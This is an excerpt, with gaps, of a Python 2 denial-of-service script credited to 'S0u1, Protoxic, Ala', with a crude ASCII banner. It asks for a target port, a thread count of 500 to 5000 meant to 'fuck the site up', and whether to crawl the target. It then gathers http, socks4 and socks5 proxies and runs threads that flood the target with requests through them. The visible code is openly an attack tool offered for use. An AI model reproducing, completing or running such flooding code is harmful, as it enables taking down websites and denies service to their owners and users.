...
print"#  | $$  | $$| $$  | $$| $$    $$| $$  | $$| $$| $$| $$_____/"
print"#  |  $$$$$$/| $$$$$$$/|  $$$$$$/| $$  | $$| $$| $$|  $$$$$$$"
print"#   \______/ | $$____/  \______/ |__/  |__/|__/|__/ \_______/"
print"#            | $$      "                                      
print"#            | $$     "                                       
print"#            |__/    "
#                                                                           
...
while n<2:
 try:
  port=input('\nPort u want the prox to have sex with : (80 or 443)\n>')
  if port in [80,443]:
   n+=1
  else:
...
while n<3:
 try:
  th=input("\n\nThreads to send to fuck the site up :(700<threads<5000)\n>")
  if ((th<5001) and (th>500)):
   n+=1
  else:
...
while n<4:
 try:
  op=input('\nDo you want to crawl your target first? we need to pimp em \n 1-yes\n 2-no\n>')
  if op in [1,2]:
   n+=1
  else:
   print"\nenter 1 or 2"
...
p5+=ips
h+=p[0]
print"Coded by S0u1, Protoxic, Ala"
print"[+]Scan finished"
print"\nhttp/https:", len(h)
p4=p[2]
print"\nsocks4:", len(p4)
p5+=p[3]
print"\nsocks5:",len(p5)
print"\nTotal Fucking Proxy Bot:",len(h)+len(p4)+len(p5),"\n"
for bh in range(10):
  ...
  while True:
   try:
    ...
    for l in range(random.randint(1,5)):
     ...
     try:
      s.send(m)
      print"[!]Request sent | S0u1Bot: {} | Thread: {}".format(ipp,c+1)
